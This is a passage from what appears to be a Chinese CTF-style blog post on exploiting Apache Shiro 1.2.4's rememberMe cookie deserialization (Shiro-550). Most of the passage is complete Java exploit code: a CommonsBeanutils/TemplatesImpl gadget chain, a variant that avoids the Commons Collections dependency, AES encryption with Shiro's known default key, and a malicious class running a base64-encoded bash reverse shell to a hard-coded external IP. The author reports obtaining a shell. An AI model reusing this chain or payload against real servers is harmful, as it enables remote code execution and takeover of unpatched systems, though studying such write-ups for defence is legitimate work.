src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679908432292-511a0259-bdf8-42a2-bce3-ca4d583124a0.png#averageHue=%232f2f29&clientId=u8f78e0c1-fda6-4&from=paste&height=198&id=u42856c33&name=image.png&originHeight=247&originWidth=818&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=278967&status=done&style=none&taskId=u03893aec-78b8-499d-84cb-99d96684097&title=&width=654.4" alt="image.png"><br><code>newTransformer()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679908571619-115de67a-425e-4d1c-8747-487b8d90bf7d.png#averageHue=%232a2b26&clientId=u8f78e0c1-fda6-4&from=paste&height=326&id=u29f4479b&name=image.png&originHeight=408&originWidth=1847&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=990064&status=done&style=none&taskId=u2af153de-1c5f-4f85-bcd2-ce8d27b1a0d&title=&width=1477.6" alt="image.png"><br><code>getTransletInstance()</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679908728832-334ee4f4-479f-4aa8-8dbe-493bd863a48d.png#averageHue=%232c2d29&clientId=u8f78e0c1-fda6-4&from=paste&height=387&id=u97a6bf5c&name=image.png&originHeight=484&originWidth=2018&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1291277&status=done&style=none&taskId=u3f4cd085-289e-44c6-bc84-7d5824a9780&title=&width=1614.4" alt="image.png"><br>最后NewInstance RCE</p>
+<h1 id="三、Shiro550-Attack"><a href="#三、Shiro550-Attack" class="headerlink" title="三、Shiro550 Attack"></a>三、Shiro550 Attack</h1><h2 id="（1）环境搭建"><a href="#（1）环境搭建" class="headerlink" title="（1）环境搭建"></a>（1）环境搭建</h2><p><a target="_blank" rel="noopener" href="https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4</a><br>由于要JDK7太麻烦了就不搭建了（浪费了点时间，得吃饭了）<br>这里我直接拉镜像了XD<br><code>docker pull medicean/vulapps:s_shiro_1</code><br><code>docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></p>
+<h2 id="（2）POC分析"><a href="#（2）POC分析" class="headerlink" title="（2）POC分析"></a>（2）POC分析</h2><p>其实Shiro 550用的就是上面的链子，Shiro的触发点是Cookie处解码时会进行反序列化，他生成的反序列化字符串是进行AES对称加密的，因此要在最后生成的Base64字符串再进行一次AES加密</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">finalpayload</span> <span class="operator">=</span> aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在当前环境中shiro中是没有cc依赖的，因此运行上述poc会出现一个报错：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679933893645-571c462a-7344-43a2-86de-de5cdd4fce9e.png#averageHue=%237f894a&clientId=u5e5415d9-bffa-4&from=paste&height=818&id=u90b706d2&name=image.png&originHeight=1022&originWidth=1501&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=334856&status=done&style=none&taskId=ud04a00d7-7d08-42bf-ab5e-917410dcd60&title=&width=1200.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679933918739-e1f5ce10-4473-4044-aaff-7ae17f6e968c.png#averageHue=%23e1b06f&clientId=u5e5415d9-bffa-4&from=paste&height=450&id=uc07786e9&name=image.png&originHeight=563&originWidth=1194&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=77584&status=done&style=none&taskId=udccca270-e76e-4af5-9ad2-4fa8d4ef913&title=&width=955.2" alt="image.png"><br>虽然shiro中内置了CommonCollection的一部分，但是并不是所有，而<code>org.apache.commons.collections.comparators.ComparableComparator</code>这个类就在CC包里面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679934080633-6c3806ec-badb-4c13-9887-3d9dd0cd0430.png#averageHue=%232f312d&clientId=u5e5415d9-bffa-4&from=paste&height=424&id=u0ff93c42&name=image.png&originHeight=530&originWidth=1155&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=962295&status=done&style=none&taskId=u37069979-566e-4fa4-89e1-8f1b21dde18&title=&width=924" alt="image.png"><br>因此无法找到该类，也就报错了</p>
+<h2 id="（3）无依赖Attack-Shiro"><a href="#（3）无依赖Attack-Shiro" class="headerlink" title="（3）无依赖Attack Shiro"></a>（3）无依赖Attack Shiro</h2><p>问题所在点也就是Compare方法上<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679934347091-48d5add7-2ca6-4198-8e16-2ac0e016f630.png#averageHue=%232f2e29&clientId=u5e5415d9-bffa-4&from=paste&height=315&id=u22a18ff6&name=image.png&originHeight=394&originWidth=1188&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=660102&status=done&style=none&taskId=ucefd9837-0cb8-4ef4-902a-0be0d860db5&title=&width=950.4" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679934360332-40ec0f72-6290-40ca-b286-b4c5ee2f7b63.png#averageHue=%2330312d&clientId=u5e5415d9-bffa-4&from=paste&height=194&id=ueb2f1df6&name=image.png&originHeight=242&originWidth=949&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=332751&status=done&style=none&taskId=ub8d150f8-a973-4abf-a7d1-83359d5e1ff&title=&width=759.2" alt="image.png"><br>如果不传入Comparator的话，那么默认就是ComparableComparator，因此我们需要指定一个Comparator</p>
+<ul>
+<li>实现java.util.Comparator接口</li>
+<li>实现java.io.Serializable接口</li>
+<li>Java、shiro或commons-beanutils自带，且兼容性强</li>
+</ul>
+<p>通过IDEA的功能，我们找到一个CaseInsensitiveComparator：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679935123183-b42fe167-f7b3-44b0-8348-4652384946a3.png#averageHue=%232a2b27&clientId=u5e5415d9-bffa-4&from=paste&height=563&id=u12a941f6&name=image.png&originHeight=704&originWidth=1627&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1558972&status=done&style=none&taskId=uf4b65ff8-7f45-406c-bdcb-08dd4917e9f&title=&width=1301.6" alt="image.png"><br>这样就可以不报错了，但是触发流程还是在get触发的，这个只是为了不报错<br>因此最终POC确立为：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(evil.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, String.CASE_INSENSITIVE_ORDER);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        queue.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="type">byte</span>[] payload= barr.toByteArray();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">byte</span> [] key = Base64.getDecoder().decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">finalpayload</span> <span class="operator">=</span> aes.encrypt(payload,key);</span><br><span class="line">        System.out.println(finalpayload.toString());</span><br><span class="line">        <span class="comment">//System.out.println(barr);</span></span><br><span class="line">        <span class="comment">//ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));</span></span><br><span class="line">        <span class="comment">//Object o = (Object)ois.readObject();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzUuMjQuMjM1LjE3Ni84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679935200791-697b94b4-dd68-4e2f-b7c2-4da4d6f06f37.png#averageHue=%23252323&clientId=u5e5415d9-bffa-4&from=paste&height=191&id=u76de931b&name=image.png&originHeight=239&originWidth=1012&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25125&status=done&style=none&taskId=u092e4cb9-aba2-4f7e-9494-2874e92516b&title=&width=809.6" alt="image.png"><br>收获反弹shell一枚~</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/29/%E5%AE%89%E6%B4%B5%E6%9D%AF2022%20_%20ezjaba/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">安洵杯2022 ezjaba</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/29/NKCTF%202023%20_%20Web/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">NKCTF2023 Web</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
